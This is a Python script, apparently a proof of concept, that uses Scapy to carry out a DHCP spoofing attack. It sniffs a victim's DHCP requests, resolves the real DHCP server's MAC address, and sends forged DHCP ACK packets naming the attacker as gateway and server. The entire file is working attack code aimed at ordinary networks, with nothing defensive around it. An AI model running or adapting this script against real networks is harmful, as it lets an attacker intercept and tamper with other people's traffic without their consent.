from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP, ARP,
    sendp, sniff, srp
)
import argparse


parser = argparse.ArgumentParser(description="Make manipulate DHCP ACK")
parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
parser.add_argument("-d", "--dhcp", required=True, help="DHCP Server IP address")
parser.add_argument("-a", "--attacker", required=True, help="Attacker IP address")
parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0, wlan0).")
args = parser.parse_args()

def get_mac(ip):
    # Sends an ARP request to retrieve the MAC address of the specified IP
    request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / request
    answer = srp(final_packet, iface=args.interface, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac

# Get transaction id and MAC from the original DHCP request
def handle_request(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 3:  # message-type == REQUEST(3)
        xid        = pkt[BOOTP].xid
        client_mac = pkt[Ether].src
        client_ip  = pkt[BOOTP].ciaddr or pkt[BOOTP].yiaddr
        send_fake_ack(xid, client_mac, client_ip)

# Create fake DHCP ACK and send 
def send_fake_ack(xid, client_mac, client_ip):
    # Ethernet layer: src="MAC of gateway(DHCP Server)", dst="MAC of target"
    dhcp_mac = get_mac(args.dhcp)
    print(f"[+] FOUND PACKET {client_mac}")
    ether = Ether(src=dhcp_mac, dst=client_mac)

    # IP/UDP Layer: src="gateway ip", dst="target ip"
    ip    = IP (src=args.dhcp, dst=args.victim)     
    udp   = UDP(sport=67, dport=68)

    # BOOTP Layer: op=2(Reply), yiaddr= IP that the target will be given
    bootp = BOOTP(op=2,
                  xid=xid,
                  yiaddr="192.168.10.77",        # IP that the target will be given
                  siaddr=args.attacker,          # Attacker's IP(Gateway)
                  chaddr=bytes.fromhex(client_mac.replace(":", "")))

    # DHCP Layer
    dhcp  = DHCP(options=[
        ("message-type", 5), # 5 = "ACK"
        ("server_id",    args.attacker),
        ("lease_time",   86400),
        ("subnet_mask",  "255.255.255.0"),
        ("router",       args.attacker),
        ("vendor_specific", b"PoC"),
        "end"
    ])
    pkt = ether / ip / udp / bootp / dhcp
    sendp(pkt, iface=args.interface, verbose=False)
    print(f"[+] Spoofed DHCP ACK sent to {client_mac}")

sniff(filter="udp and (port 67 or port 68) and host {}".format(args.victim), prn=handle_request, iface=args.interface)